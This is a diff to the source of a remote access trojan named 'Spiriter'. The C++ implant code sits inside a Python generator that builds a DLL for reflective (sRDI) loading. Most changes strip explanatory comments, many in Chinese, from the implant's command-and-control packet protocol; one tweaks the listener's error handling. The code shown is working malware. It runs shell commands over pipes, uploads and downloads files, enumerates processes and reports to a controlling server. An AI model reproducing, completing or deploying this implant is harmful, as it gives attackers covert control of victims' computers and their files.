@@ -26,12 +26,12 @@ CCodes="""
 #include <shlwapi.h>
 using namespace std;
 
-//Library Load
+
 #pragma comment(lib,\"ws2_32.lib\")
 #pragma comment(lib, \"shlwapi.lib\")
 
 
-//Contral Code
+
 #define BUFFER_SIZE        4124
 #define SPIRITER_INIT    0x0
 #define SPIRITER_PS        0x1
@@ -154,38 +154,10 @@ RAT::~RAT()
     WSACleanup();
 }
 
-/*
-*  *****************************************************************************
-*    Example:Send(ContralCode,Payload,PayloadLenght);
-*        Send Payload or Data
-*    @ContralCode:    SPIRITER Contral 
-*        #define BUFFER_SIZE        4124
-*        #define SPIRITER_INIT    0x0
-*        #define SPIRITER_PS        0x1
-*        #define SPIRITER_EXEC    0x2
-*        #define SPIRITER_UPLOAD 0x3
-*
-*    @Payload:        Send Data
-*    
-*    @PayloadLenght:    Send DataLenght
-*     *****************************************************************************
-*/
+
 BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
 {
-    /*
-        该函数会把数据包进行切割，分为多个4096位的数据包一并发送到目标上。
-        typedef struct RatRet {
-            char Header[8];        4  协议头
-            DWORD Command;        4  控制码
-            DWORD DataSize;        4  本次数据包长度  
-            DWORD ToalLength;    4  完整数据包长度
-            DWORD SendCount;    4  发送的次数
-            DWORD ToalCount;    4  完整发送次数
-            char *Buffer;        x  存放数据缓冲区
-        }RetData, *PRetData;
-        程序会构造成以上的结构体为结构，主要是为了整体数据包不会有误差。
 
-    */
     char* Buffer = NULL;
     char Send[4124];
     int nCount = 0;
@@ -196,25 +168,25 @@ BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
     PDataStruct Value;
     memset(&Send, 0, sizeof(Send));
     Value = (PDataStruct)&Send;
-    memcpy(Value->Header, \"Spiriter\", sizeof(\"Spiriter\")); //设置协议头
-    Value->ToalLength = ToalLength; //设置总长度
-    Value->Command = Commnad; //设置ContralCode
+    memcpy(Value->Header, \"Spiriter\", sizeof(\"Spiriter\"));
+    Value->ToalLength = ToalLength;
+    Value->Command = Commnad;
     nCount = ToalLength / 4096; 
-    //printf(\"\\nCount:%d\\n\", (nCount % 4096));
-    if ((nCount % 4096) >= 0    and    (ToalLength   > 4096)) {
+
+    if ((nCount % 4096) >= 0  && (ToalLength   > 4096)) {
         nCount++;
     }
     else if(ToalLength<4096) {
         nCount++;
     }
     Value->ToalCount = nCount;
-    //以上将数据包进行计算，计算出要发送次数。
+ 
     while (true)
     {
         SendCount++;
         Value->SendCount = SendCount;
         if (ToalLength - SendedSize <= 4096) {
-            //最后一次发送，会对总长度进行校验，或者小于4096时直接进行此步。
+  
             SendLenght= ToalLength - SendedSize;
             Value->DataSize = SendLenght;
             memcpy(Value->Buffer, Data + SendedSize, SendLenght);
@@ -230,7 +202,7 @@ BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
             
         }
         else {
-            //发送长度为4096数据包，并且进行计算。
+           
             SendLenght = 4096;
             Value->DataSize = SendLenght;
             memcpy(Value->Buffer, Data + SendedSize, SendLenght);
@@ -249,28 +221,10 @@ BOOL RAT::Send(DWORD Commnad, char* Data, DWORD ToalLength)
 }
 
 
-/*
-Example:Receive
-    Receive Buffer or Data
-    Return Struct 
-        typedef struct RatRet {
-            char Header[8];
-            DWORD Command;
-            DWORD DataSize;
-            DWORD ToalLength;
-            DWORD SendCount;
-            DWORD ToalCount;
-            char * Buffer;
-        }RetData, *PRetData;
 
-*/
 RetData RAT::Receive()
 {
-    /*
-        接受来自服务端的数据。
-        会申请一块堆内存，并且数据以4096长度形式发送，会将其进行合并处理。
-        并且判断长度是否有误差
-    */
+  
     PRetData Ret;
     char* Buffer = NULL;
     char RecvBuffer[BUFFER_SIZE];
@@ -290,12 +244,12 @@ RetData RAT::Receive()
             ExitProcess(0);
         }
         if (strcmp(Header, \"Spiriter\") == 0) {
-            if (Buffer == NULL) {//首次接收时，先进行内存申请。并且进行清0处理。
+            if (Buffer == NULL) {
                 ToalLength = Ret->ToalLength;
                 Buffer = (char*)malloc(ToalLength);
                 memset(Buffer, 0, ToalLength);
             }
-            if(Count == Ret->SendCount){ //通过判断Count参数是否跟接收的发送次数一样。用来校验数据顺序准确。
+            if(Count == Ret->SendCount){ 
                 memcpy(Buffer + WriteLengt, RecvBuffer + 28, Ret->DataSize);
                 WriteLengt = WriteLengt + Ret->DataSize;
             }
@@ -303,9 +257,9 @@ RetData RAT::Receive()
                 Count = 0; ToalLength = 0;
                 free(Buffer);
                 Buffer = NULL;
-                continue; //清空前面的数据。
+                continue; 
             }
-            if (ToalLength == WriteLengt && Count == Ret->SendCount ) {//通过判断长度和次数进行判断是否最后一组数据包
+            if (ToalLength == WriteLengt && Count == Ret->SendCount ) {
                 Ret->Buffer = Buffer;
                 return *Ret;
             }
@@ -328,12 +282,7 @@ RetData RAT::Receive()
 
 
 
-/*
- *****************************************************************************
- *   功能区 
- * PipeCmd（命令执行核心）  WriteFileA（文件写入）  ExecCode（命令执行核心） EnumProcess（进程枚举）
- *****************************************************************************
- */
+
 
 
 BOOL RAT::PipeCmd(char* pszCmd, char* pszResultBuffer, DWORD dwResultBufferSize)
@@ -406,7 +355,7 @@ BOOL RAT::WriteFileA(RetData Ret) {
 
 BOOL RAT::Download(RetData Ret)
 {
-    FileUpload FileInfo; //使用FileUpload为下载请求结构。
+    FileUpload FileInfo; 
     FileUpload Downloads;
     WIN32_FIND_DATA wfd;
     char Filename[MAX_PATH];
@@ -474,8 +423,7 @@ BOOL RAT::Download(RetData Ret)
         return FALSE;
     }
 
-    //HANDLE handle = CreateFile(FileInfo.Filename, FILE_READ_EA,FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
-    return 0;
+     return 0;
 }
 
 VOID RAT::ExecCode(RetData Ret)
@@ -524,7 +472,6 @@ void RAT::EnumProcess()
             memcpy(Buffer + WriteOffset, Form, strlen(Form));
             WriteOffset += strlen(Form);
         }
-        //printf(\"%s\", Buffer);
         CloseHandle(hSnap);
         Send(0x1, Buffer, SendLenth / 2);
     
@@ -903,7 +850,7 @@ endif()
         try:
             Sock.bind((host, port))
         except Exception as error:
-            pass
+            print_error(error.__str__())
             return
         
         Sock.listen(1024)
@@ -914,7 +861,7 @@ endif()
         self.Copy = False
         self.Type="dll"
         self.GenerateType="Spiriter"
-        self.STDOUT=True
+        self.STDOUT=False
         print_msg("Start to generate the DLL required by sRdi")
         print_warning("Please wait for the compilation to complete,")
         DLLPath=self.GenerateSpiriter()
